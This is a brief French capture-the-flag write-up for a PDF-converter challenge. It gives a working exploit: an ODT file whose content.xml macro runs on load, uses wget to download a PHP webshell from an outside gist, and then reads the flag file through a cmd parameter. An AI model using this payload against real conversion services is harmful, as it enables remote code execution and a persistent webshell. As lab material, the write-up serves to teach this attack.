# Icare/Convertor

# Description

Un Dev a mis en place une petite page web, pour convertir des documents au format pdf.

Est-ce que c'est assez robuste ?

Récupérer le Flag dans /flag/flag.txt

# Writeup

Fichier pdf de Icare

# Test

créer un fichier.odt
```
unzip le fichier.odt
```
Ajouter une macro qui dl un webshell dans content.xml
```
<office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="office:load-finished" xlink:href="macro:shell(%22wget%20https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php%22)" xlink:type="simple"/></office:event-listeners></office:scripts>
```
Re-zip le fichier
```
7z a fichier.odt *
```
Upload le fichier

Accès au webshell 
```
http://127.0.0.1/easy-simple-php-webshell.php?cmd=cat+%2Fflag%2Fflag.txt
```
